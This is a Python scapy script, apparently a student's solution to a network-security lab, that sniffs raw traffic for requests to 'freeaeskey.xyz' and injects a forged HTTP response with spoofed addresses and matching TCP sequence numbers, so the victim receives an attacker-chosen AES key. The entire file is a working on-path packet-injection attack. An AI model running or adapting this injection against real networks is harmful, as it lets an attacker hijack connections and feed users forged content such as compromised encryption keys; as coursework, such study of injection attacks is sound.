#!/usr/bin/python3

from scapy.all import send, conf, L3RawSocket
from scapy.all import TCP,IP,Ether
import socket
import sys

# Use this function to send packets
def inject_pkt(pkt):
    conf.L3socket=L3RawSocket
    send(pkt)

###
# edit this function to do your attack
###
def handle_pkt(pkt):

    ## read packets until a match is found
    if "freeaeskey.xyz" in str(pkt):

        # store current packet
        curr_pkt = Ether(pkt)

        # store things we need in variables
        req_pkt_len  = curr_pkt[IP].len
        req_src_ipa = curr_pkt[IP].src
        req_dst_ipa = curr_pkt[IP].dst
        req_src_mac = curr_pkt[Ether].src
        req_dst_mac = curr_pkt[Ether].dst
        req_src_prt = curr_pkt[TCP].sport
        req_dst_prt = curr_pkt[TCP].dport
        req_tcp_seq = curr_pkt[TCP].seq
        req_tcp_ack = curr_pkt[TCP].ack
        req_tcp_flg = curr_pkt[TCP].flags
        req_offset  = len(curr_pkt[TCP].payload)

        # construct ip layers
        ip_layer  = IP(src=req_dst_ipa, dst=req_src_ipa)
        tcp_layer = TCP(seq=req_tcp_ack, ack=(req_tcp_seq + req_offset), flags=req_tcp_flg, sport=req_dst_prt, dport=req_src_prt)

        # construct payload data
        data =    'HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nDate: Wed, 27 Oct 2021 20:19:21 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>'

        # construct payload
        payload = ip_layer / tcp_layer / data

        # print vars for debugging
        #print(curr_pkt)
        #print(req_pkt_len)
        #print(req_dst_ipa)
        #print(req_src_ipa)
        #print(req_dst_mac)
        #print(req_src_mac)
        #print(req_src_prt)
        #print(req_dst_prt)
        #print(req_tcp_seq)
        #print(req_tcp_ack)
        #print(req_tcp_flg)
        #print(req_offset)
        #print(payload)

        # quit program for testing purposes
        #sys.exit()

        # inject payload
        inject_pkt(payload)

def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__=='__main__':
    main()
